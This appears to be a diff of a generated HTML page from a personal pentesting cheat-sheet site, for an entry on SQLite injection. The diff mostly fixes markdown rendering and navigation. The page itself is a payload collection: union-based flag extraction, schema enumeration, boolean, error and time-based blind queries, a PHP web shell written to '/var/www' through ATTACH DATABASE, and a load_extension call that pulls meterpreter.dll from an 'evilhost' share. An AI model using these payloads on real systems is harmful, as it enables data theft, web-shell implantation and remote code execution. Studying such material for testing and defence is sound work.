@@ -15,6 +15,10 @@
         <link rel="canonical" href="https://amandaguglieri.github.io/hackinglife/sqlite/">
       
       
+        <link rel="prev" href="../sqli-manual-attack/">
+      
+      
+        <link rel="next" href="../sqlmap/">
       
       
       <link rel="icon" href="../img/favicon.png">
@@ -264,8 +268,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -621,14 +627,16 @@
       
         
       
+        
+      
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
         
           
           <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
@@ -642,7 +650,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_1">
             <span class="md-nav__icon md-icon"></span>
             Cheat sheets
@@ -3605,6 +3613,103 @@
   
 
       </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    sqlite
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    sqlite
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#basic-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic payloads
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-command-execution-using-sqlite-command-attach-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Command Execution using SQLite command - Attach Database
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-command-execution-using-sqlite-command-load_extension" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Command Execution using SQLite command - Load_extension
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -14644,6 +14749,33 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#remote-command-execution-using-sqlite-command-attach-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Command Execution using SQLite command - Attach Database
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-command-execution-using-sqlite-command-load_extension" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Command Execution using SQLite command - Load_extension
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -14695,43 +14827,54 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>a&#39; or &#39;1&#39;=&#39;1&#39; union select flag,2,value,4,5 from secret_flag --
 </span></code></pre></div>
 <p>Source: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p>
-<p>```sql</p>
-<h1 id="sqlite-comments">SQLite comments</h1>
-<p>--
-/**/</p>
-<h1 id="sqlite-version">SQLite version</h1>
-<p>select sqlite_version();</p>
-<h1 id="string-based-extract-database-structure">String based: Extract database structure</h1>
-<p>SELECT sql FROM sqlite_schema</p>
-<h1 id="integer-or-string-based-extract-table-name">\Integer or String based: Extract table name</h1>
-<p>SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'</p>
-<h1 id="integer-or-string-based-extract-column-name">\Integer or String based: Extract column name</h1>
-<p>SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'</p>
-<h1 id="for-a-clean-output">For a clean output</h1>
-<p>SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'</p>
-<h1 id="cleaner-output">Cleaner output</h1>
-<p>SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');</p>
-<h1 id="boolean-count-number-of-tables">\Boolean: Count number of tables</h1>
-<p>and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) &lt; number_of_table</p>
-<h1 id="boolean-enumerating-table-name">\Boolean: Enumerating table name</h1>
-<p>and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number</p>
-<h1 id="boolean-extract-info">\Boolean:  Extract info</h1>
-<p>and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('some_char')</p>
-<h1 id="boolean-extract-info-order-by">\Boolean: Extract info (order by)</h1>
-<p>CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END</p>
-<h1 id="boolean-error-based">\Boolean: Error based</h1>
-<p>AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END</p>
-<h1 id="time-based">\Time based</h1>
-<p>AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>## Remote Command Execution using SQLite command - Attach Database
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>```sql
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>ATTACH DATABASE &#39;/var/www/lol.php&#39; AS lol;
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>CREATE TABLE lol.pwn (dataz text);
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>INSERT INTO lol.pwn (dataz) VALUES (&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;);--
-</span></code></pre></div></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">#</span><span class="w"> </span><span class="n">SQLite</span><span class="w"> </span><span class="n">comments</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1">--</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="cm">/**/</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="o">#</span><span class="w"> </span><span class="n">SQLite</span><span class="w"> </span><span class="k">version</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="k">select</span><span class="w"> </span><span class="n">sqlite_version</span><span class="p">();</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="o">#</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">based</span><span class="p">:</span><span class="w"> </span><span class="k">Extract</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="k">structure</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">sql</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_schema</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Integer</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">based</span><span class="p">:</span><span class="w"> </span><span class="k">Extract</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">name</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">tbl_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;sqlite_%&#39;</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Integer</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">based</span><span class="p">:</span><span class="w"> </span><span class="k">Extract</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="n">name</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">sql</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">!=</span><span class="s1">&#39;meta&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">sql</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;table_name&#39;</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="o">#</span><span class="w"> </span><span class="k">For</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">clean</span><span class="w"> </span><span class="k">output</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="k">sql</span><span class="p">,</span><span class="n">instr</span><span class="p">(</span><span class="k">sql</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">b1</span><span class="p">)),</span><span class="n">instr</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="k">sql</span><span class="p">,</span><span class="n">instr</span><span class="p">(</span><span class="k">sql</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">b1</span><span class="p">)),</span><span class="s1">&#39;&#39;</span><span class="p">)),</span><span class="ss">&quot;TEXT&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;INTEGER&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;AUTOINCREMENT&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;PRIMARY KEY&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;UNIQUE&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;NUMERIC&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;REAL&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;BLOB&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;NOT NULL&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="ss">&quot;,&quot;</span><span class="p">,</span><span class="s1">&#39;~~&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">!=</span><span class="s1">&#39;meta&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">sql</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;sqlite_%&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;table_name&#39;</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="o">#</span><span class="w"> </span><span class="n">Cleaner</span><span class="w"> </span><span class="k">output</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">column_names</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pragma_table_info</span><span class="p">(</span><span class="s1">&#39;table_name&#39;</span><span class="p">);</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Boolean</span><span class="p">:</span><span class="w"> </span><span class="k">Count</span><span class="w"> </span><span class="nb">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">tables</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="n">tbl_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;sqlite_%&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">number_of_table</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Boolean</span><span class="p">:</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">name</span>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">length</span><span class="p">(</span><span class="n">tbl_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;sqlite_%&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="n">table_name_length_number</span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Boolean</span><span class="p">:</span><span class="w">  </span><span class="k">Extract</span><span class="w"> </span><span class="n">info</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="n">tbl_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;sqlite_%&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="s1">&#39;some_char&#39;</span><span class="p">)</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Boolean</span><span class="p">:</span><span class="w"> </span><span class="k">Extract</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="p">(</span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="p">)</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">sql</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;sqlite_%&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="s1">&#39;some_char&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="o">&lt;</span><span class="n">order_element_1</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">order_element_2</span><span class="o">&gt;</span><span class="w"> </span><span class="k">END</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="nb">Boolean</span><span class="p">:</span><span class="w"> </span><span class="n">Error</span><span class="w"> </span><span class="n">based</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="k">AND</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">[</span><span class="n">BOOLEAN_QUERY</span><span class="p">]</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="n">load_extension</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">END</span>
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="o">#</span><span class="w"> </span><span class="err">\</span><span class="k">Time</span><span class="w"> </span><span class="n">based</span>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="k">AND</span><span class="w"> </span><span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span><span class="o">=</span><span class="k">LIKE</span><span class="p">(</span><span class="s1">&#39;ABCDEFG&#39;</span><span class="p">,</span><span class="k">UPPER</span><span class="p">(</span><span class="n">HEX</span><span class="p">(</span><span class="n">RANDOMBLOB</span><span class="p">([</span><span class="n">SLEEPTIME</span><span class="p">]</span><span class="mi">00000000</span><span class="o">/</span><span class="mi">2</span><span class="p">))))</span>
+</span></code></pre></div>
+<h2 id="remote-command-execution-using-sqlite-command-attach-database">Remote Command Execution using SQLite command - Attach Database</h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">ATTACH</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="s1">&#39;/var/www/lol.php&#39;</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">lol</span><span class="p">;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">lol</span><span class="p">.</span><span class="n">pwn</span><span class="w"> </span><span class="p">(</span><span class="n">dataz</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">lol</span><span class="p">.</span><span class="n">pwn</span><span class="w"> </span><span class="p">(</span><span class="n">dataz</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="p">);</span><span class="c1">--</span>
+</span></code></pre></div>
 <h2 id="remote-command-execution-using-sqlite-command-load_extension">Remote Command Execution using SQLite command - Load_extension</h2>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">load_extension</span><span class="p">(</span><span class="s1">&#39;\\evilhost\evilshare\meterpreter.dll&#39;</span><span class="p">,</span><span class="s1">&#39;DllMain&#39;</span><span class="p">);</span><span class="c1">--</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">load_extension</span><span class="p">(</span><span class="s1">&#39;\\evilhost\evilshare\meterpreter.dll&#39;</span><span class="p">,</span><span class="s1">&#39;DllMain&#39;</span><span class="p">);</span><span class="c1">--</span>
 </span></code></pre></div>
 <h2 id="references">References</h2>
 <p><a href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf">Injecting SQLite database based application - Manish Kishan Tanwar</a>
@@ -14739,7 +14882,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-03-23T22:09:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-03-23</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-03-23T22:27:21+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-03-23</span></small></br>
 
 
     <small>Created: March 23, 2024 22:09:17</small>
